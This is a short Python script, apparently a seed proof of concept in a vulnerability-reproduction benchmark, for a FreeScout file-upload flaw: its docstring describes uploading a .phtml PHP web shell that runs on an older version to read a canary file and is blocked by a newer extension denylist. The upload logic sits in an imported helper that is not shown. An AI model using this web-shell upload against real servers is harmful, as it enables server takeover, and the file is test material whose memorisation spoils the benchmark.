#!/usr/bin/env python3
"""[GIVEN] CVE-2025-48471 seed exploit for freescout-cve-2026-53593.

Upload a `.phtml` PHP web shell. On v0 (1.8.178, before the denylist) the extension is
preserved and Apache/mod_php executes it -> reads /canary.txt. On v1 (1.8.223) the
denylist added phtml/phar, so the file is renamed to an inert name -> blocked.
"""
import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from poc_common import upload_and_exec  # noqa: E402


def candidate(*, version="v1"):
    return upload_and_exec(version, "phtml")


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("VERSION") or "v1"
    r = candidate(version=v)
    print(json.dumps(r, default=str))
